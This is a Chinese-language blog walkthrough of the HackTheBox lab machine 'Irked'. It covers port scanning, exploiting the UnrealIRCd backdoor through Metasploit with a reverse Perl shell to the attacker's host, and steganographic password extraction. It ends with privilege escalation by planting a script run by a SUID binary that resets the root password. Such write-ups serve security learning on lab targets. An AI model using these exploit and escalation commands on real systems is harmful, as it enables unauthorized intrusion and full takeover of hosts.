---
title: HackTheBox-Irked
tags:
  - 靶机渗透
categories:
  - 技术水文
copyright: true
abbrlink: ae29f7a1
date: 2019-01-31 20:50:39
---

![](https://ae01.alicdn.com/kf/HTB14mSfaCWD3KVjSZSgq6ACxVXaU.jpg)
<!--more-->
<div class="yinyue" style="text-align:center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=428642586&auto=1&height=66"></iframe></div>

## 信息收集 ##

### 扫描目标机器开放的端口 ###

```bash
masscan -p1-65535 10.10.10.117 --rate=1000 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr ​'\n'​ ​','​ | sed 's/,$//')

nmap -Pn -A -sV -sC -p$ports 10.10.10.117
```

![](https://ae01.alicdn.com/kf/HTB17_edaEKF3KVjSZFE760ExFXaM.png)

目标机上运行着http服务，使用`gobuster`爆了下目录，没有发现什么。

访问下web站点，似乎发现了些什么，`IRC is almost working!`, 在回看nmap扫描输出信息`6697`和`8067`端口上就运行着`IRC`

![](https://ae01.alicdn.com/kf/HTB1u.OdaEuF3KVjSZK9762VtXXat.png)

### 使用HexChat连接到目标机 ###

nmap没探测出关于IRC更多的信息，所以使用hexchat连接目标，看看是否能找到其他信息。例如版本号之类的。

由于kali上没有 `HexChat` 所以先安装该工具

```bash
apt-get install hexchat -y
```

启动 Hexchat 添加新连接

![](https://ae01.alicdn.com/kf/HTB14uykaBCw3KVjSZR0762cUpXaq.png)

连接成功，版本是`Unreal 3.2.1`, 搜索一下该版本有什么漏洞

![](https://ae01.alicdn.com/kf/HTB1enidavWG3KVjSZFP760aiXXaz.png)

搜索到以下几个漏洞

![](https://ae01.alicdn.com/kf/HTB1__Omaq5s3KVjSZFN763D3FXal.png)

![](https://ae01.alicdn.com/kf/HTB1QYKdaxiH3KVjSZPf760BiVXaC.png)

## 漏洞利用 ##

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set payload cmd/unix/reverse_perl
set RHOST 10.10.10.117  #目标
set RPORT 6697          #目标端口
set LHOST 10.10.13.129  #kali
run
```

成功得到shell会话

![](https://ae01.alicdn.com/kf/HTB1JmWjaBGw3KVjSZFw762Q2FXaL.png)

为了方便，这里使用python弹个交互式的shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

**寻找flag（user.txt）**

经过查找，发现 `user.txt` 在另外一个用户 `Documents`目录下，但现在的用户无法cat user.txt。后面检查了当前用户执行过的命令，发曾经cat过和user.txt同目录下的`.backup`文件。当我cat该文件时，提示这个是备份密码。尝试ssh却发现密码错误无法登录。

![](https://ae01.alicdn.com/kf/HTB1bzufaBWD3KVjSZKP761p7FXaj.png)

后面在官方论坛该靶机板块下找到了些提示：`Stego工具应与密码一起使用，首先找到Stego秘密吗，然后使用流行的Stego工具` (机器翻译的勉强看吧)。

按照提示，猜测应该是用类似 `MP3Stego` 之类的工具输入密码解密从而得到新的文件。后面在网上搜索到了kali上有个`steghide`的工具可以解密

安装steghide

```bash
apt-get install steghide
```

在解密前，先把`web`站点上的那张黄脸图片下载到本地然后使用以下命令并输入密码解密，密码为`.backup`里面`UP`的开头的字符串，然后得到个`pass.txt`，文件内容就是另一个用户的ssh登录密码

```bash
steghide extract -sf irked.jpg
```

![](https://ae01.alicdn.com/kf/HTB1lsqfaAWE3KVjSZSy760ocXXaR.png)

**提权cat roo.txt**

查找可利用带有SUID的文件、命令

```bash
find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;
```

发现个可疑的`viewuser`命令，执行该命令报错提示找不到`/tmp/listusers`，嗯，这里利用一波，在/tmp下创建一个名为`listusers`的sh脚本。脚本里面可以写入增加个特权用户、修改root密码或者把当前用户加入到管理员组之类的命令

![](https://ae01.alicdn.com/kf/HTB1OH5daxiH3KVjSZPf760BiVXaU.png)

这里我写入修改root密码，sh脚本命令如下：

```bash
#!/bin/bash
echo root:Aa@1234567890 | /usr/sbin/chpasswd
```

修改权限为777，然后执行

```bash
chmod 777 listusers
/usr/bin/viewuser`
```

![](https://ae01.alicdn.com/kf/HTB1bPefaBWD3KVjSZKP761p7FXaJ.png)
